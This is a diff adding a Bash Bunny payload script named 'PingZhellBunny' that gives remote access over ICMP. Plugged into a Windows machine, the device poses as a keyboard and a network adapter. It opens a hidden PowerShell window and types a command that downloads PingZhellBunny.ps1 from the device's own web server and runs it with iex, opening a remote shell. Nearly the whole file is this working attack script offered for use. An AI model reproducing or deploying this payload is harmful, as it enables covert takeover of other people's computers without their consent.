@@ -1,0 +1,44 @@
+#!/bin/bash
+#
+# Title:         PingZhellBunny
+# Description:   Getting remote access via ICMP
+# Author:        0i41E
+# Version:       1.5
+# Category:      Remote_Access
+# Attackmodes:   HID, RNDIS_ETHERNET
+
+LED SETUP
+ATTACKMODE RNDIS_ETHERNET HID
+
+GET SWITCH_POSITION
+GET HOST_IP
+
+cd /root/udisk/payloads/$SWITCH_POSITION/
+
+# starting server
+LED SPECIAL
+
+# disallow outgoing dns requests so the server is accessible immediately
+iptables -A OUTPUT -p udp --dport 53 -j DROP
+python -m SimpleHTTPServer 80 &
+
+# wait until port is listening
+while ! nc -z localhost 80; do sleep 0.2; done
+
+#Opens hidden powershell instance
+Q DELAY 1500
+Q GUI r
+Q DELAY 500
+Q STRING "powershell -NoP -NonI -w h"
+Q DELAY 500
+Q ENTER
+
+Q DELAY 500
+
+#Insert attacking IP
+Q STRING "\$IP = '0.0.0.0';"
+Q DELAY 250
+Q STRING "iex (New-Object Net.WebClient).DownloadString(\"http://$HOST_IP/PingZhellBunny.ps1\")"
+Q DELAY 400
+Q ENTER
+LED FINISH
